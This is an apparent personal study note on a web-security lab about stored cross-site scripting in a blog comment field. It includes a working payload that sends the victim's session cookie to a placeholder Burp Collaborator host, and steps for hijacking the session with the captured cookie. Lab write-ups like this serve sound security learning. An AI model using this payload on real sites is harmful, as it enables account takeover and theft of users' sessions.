---
id: "202607060003"
title: Stored XSS to steal session cookies via out-of-band fetch
date: 2026-07-06
type: case
tags: [xss, stored-xss, cookie-theft, session-hijack]
source: "[[22_Lab22-Exploiting cross-site scripting to steal cookies]]"
publish: false
---

Blog comment field has no sanitization at all — confirmed with a simple `<script>document.cookie</script>` probe. Turning that into full session hijack needs [[202607060004 Exfiltrating data via fetch and an out-of-band collaborator]] plus a place to receive the stolen value, since the app's firewall blocks calls to arbitrary external hosts and only permits Burp Collaborator's own public server:

```html
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
});
</script>
```

A parallel idea was also explored and abandoned: instead of exfiltrating via `fetch`, make the victim's browser *post a new comment containing their own cookie* — visible to anyone who reads that blog post afterward, no OOB collaborator needed. That approach stalled because posting a comment requires a per-user CSRF token the attacker doesn't have in advance; see [[202607080002 XSS defeats CSRF defenses because the victim's browser supplies both the token and the session]] for why that constraint disappears entirely once the injected script itself runs *inside* the victim's browser.

Once the raw session cookie value is captured from the Collaborator interaction log, swapping it into a fresh request's `Cookie` header completes the takeover — no password needed.

## Links
- Exfiltration technique: [[202607060004 Exfiltrating data via fetch and an out-of-band collaborator]]
- The abandoned "let the victim post their own cookie" idea is resolved (and repurposed) via: [[202607080002 XSS defeats CSRF defenses because the victim's browser supplies both the token and the session]]
